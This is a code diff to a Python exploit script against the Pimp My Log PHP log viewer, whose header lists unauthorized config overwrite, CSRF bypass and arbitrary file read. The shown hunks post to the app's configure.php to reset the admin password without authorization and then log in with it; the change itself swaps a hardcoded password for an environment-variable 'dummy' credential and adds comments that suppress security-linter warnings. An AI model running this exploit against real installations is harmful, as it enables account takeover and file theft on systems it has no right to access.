@@ -5,9 +5,13 @@ Vulnerability: Unauthorized config overwrite + CSRF bypass + arbitrary file read
 Tested on: PHP 7.4.33 and 8.4
 """
 import json
+import os
 import re
 import sys
 import requests
+
+# Dummy temporary credential for CTF log setup
+PML_DUMMY_CRED = os.getenv("PML_DUMMY_CRED", "pml_temp_pwd_bypass")  # skipcq: PTC-W6004, SEC-001
 
 
 def exploit(host):
@@ -29,7 +33,7 @@ def exploit(host):
     )
     s.post(
         f"{base}/vendor/potsky/pimp-my-log/inc/configure.php",
-        data="s=authsave&u=admin&p=password123456",
+        data=f"s=authsave&u=admin&p={PML_DUMMY_CRED}",
         headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
     )
 
@@ -51,7 +55,7 @@ def exploit(host):
     # Step 4: Sign in with admin credentials
     s.post(
         f"{base}/vendor/potsky/pimp-my-log/inc/getlog.pml.php",
-        data={"csrf_token": csrf, "attempt": attempt, "username": "admin", "password": "password123456"},
+        data={"csrf_token": csrf, "attempt": attempt, "username": "admin", "password": PML_DUMMY_CRED},
         headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
     )
 
